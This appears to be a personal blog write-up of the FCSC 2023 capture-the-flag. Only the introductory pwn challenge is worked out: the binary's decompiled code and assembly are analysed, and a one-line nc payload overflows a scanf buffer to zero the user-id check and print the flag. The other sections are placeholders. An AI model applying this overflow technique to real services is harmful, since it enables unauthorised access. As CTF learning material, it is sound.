---
title: "FCSC - 2023 - Top 200"
date: 2023-04-30
draft: false
tags:
  - CTF
  - Forensic
  - Web
  - Pwn
  - Network
  - Windows
  - Disk
categories:
  - Write-ups
---

I participated in the [FCSC](https://france-cybersecurity-challenge.fr) for the second time this year. The first time was in 2019 and this I wanted to do better than the previous year. Before starting the CTF I hadn't done any CTF for a while or any cybersecurity related activities so it was a good way to get back into it. 
This post will mostly be useful for myself and also be a write-up for the challenges I have solved and found interesting. 

> Note that I mainly focused on web challenges as I am more comfortable with this type of challenge. I also did a few others.

## Intro - UUID
### Generalities
This challenge was the second one I did and I completed it way faster than I expected. 
The only thing that was given was a binary file. I started by running `file` on it to see what it was. 
```bash
❯ file  FCSC2023/pwn-uid/uid
FCSC2023/pwn-uid/uid: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cbb3387e82ca3a751e8b9d6bafec0f2e1c342af0, for GNU/Linux 3.2.0, not stripped
```

As I was thinking, this looked like a pwn challenge. This isn't at all what I'm comfortable with yet, but I wanted to give it a try.

### Analysis

The first step was to open it with `cutter` to see what was happening inside. And here the C code was pretty clear.
```c
undefined8 main(void)
{
    int64_t var_38h;
    uint64_t var_ch;
    
    var_ch._0_4_ = geteuid();
    printf("username: ");
    fflush(_stdout);
    __isoc99_scanf(data.0000200f, &var_38h);
    if ((int32_t)var_ch == 0) {
        system("cat flag.txt");
    } else {
        system("cat flop.txt");
    }
    return 0;
}
```
The program is pretty simple: it gets the user id and then asks for a username. If the user id is 0, it will print the `flag.txt`; otherwise it will print `flop.txt`.
At this point, I knew I would have to create a simple buffer overflow to change the user id to 0.
> In fact, you can have a UID equal to 0 on a machine. It just means that you are the root user. Unfortunately, I didn't know that at the time.
> Plus, you're not root on the server, so you can't read the flag.

So I started by looking at the `scanf` function. I knew that it was vulnerable to buffer overflow, so I had to find the destination buffer size to make it overflow.
After reading the pseudo-code and drawing my experience (I did a few buffer overflow and used a bit of `cutter`), I found that:
- The buffer is at `@ stack - 0x38` (0x38 = 56).
- A local variable is at `@ stack - 0xc` (0xc = 12).
Knowing this, the buffer size is 56 - 12 = 44. So, I had to send 44 characters to make it overflow !  
(To be fully honest I used the decompiled code to find the buffer size and the local variable size. It's easier to read than the assembly code)
```asm
int main (int argc, char **argv, char **envp);
; var int64_t var_38h @ stack - 0x38
; var uint64_t var_ch @ stack - 0xc
0x00001175      push    rbp
0x00001176      mov     rbp, rsp
0x00001179      sub     rsp, 0x30
0x0000117d      call    geteuid    ; sym.imp.geteuid ; uid_t geteuid(void)
0x00001182      mov     dword [var_ch], eax
0x00001185      lea     rdi, str.username: ; 0x2004 ; const char *format
0x0000118c      mov     eax, 0
0x00001191      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x00001196      mov     rax, qword stdout ; obj.__TMC_END
                                   ; 0x4050
0x0000119d      mov     rdi, rax   ; FILE *stream
0x000011a0      call    fflush     ; sym.imp.fflush ; int fflush(FILE *stream)
0x000011a5      lea     rax, [var_38h]
0x000011a9      mov     rsi, rax
0x000011ac      lea     rdi, data.0000200f ; 0x200f ; const char *format
0x000011b3      mov     eax, 0
0x000011b8      call    __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x000011bd      cmp     dword [var_ch], 0
0x000011c1      jne     0x11d1
0x000011c3      lea     rdi, str.cat_flag.txt ; 0x2012 ; const char *string
0x000011ca      call    system     ; sym.imp.system ; int system(const char *string)
0x000011cf      jmp     0x11dd
0x000011d1      lea     rdi, str.cat_flop.txt ; 0x201f ; const char *string
0x000011d8      call    system     ; sym.imp.system ; int system(const char *string)
0x000011dd      mov     eax, 0
0x000011e2      leave
0x000011e3      ret
0x000011e4      nop     word cs:[rax + rax]
0x000011ee      nop
```

### The exploit
We are going to create a really simple exploit. We will send 44 characters to the program, plus `\x00` to overwrite the local variable and make it equal to 0.  
This way, we go inside the `if` statement and we can read the flag.
```bash
python3 -c 'print("A"*44 + "\x00")' | nc challenges.france-cybersecurity-challenge.fr 2100
```
And there we go, we have the flag !
<img src="/FCSC-2023/pwn-uid.png" alt="flag" width="700"/>

## Intro - La gazette de windows
*Coming soon*

## Intro - Tri Séléctif
*Coming soon*

## Intro - Comparaison
*Coming soon*

## Web - ENISA Flag Store 1/2
*Coming soon*

## Web - ENISA Flag Store 2/2
*Coming soon*

## Web - Salty Authentication
*Coming soon*

## Web - Hello from the inside
*Coming soon*

## Hardware - Fibonacci
*Coming soon*

## Forensic - Ransomémoire 0/3
*Coming soon*

## Misc - Tri Trés Séléctif
*Coming soon*
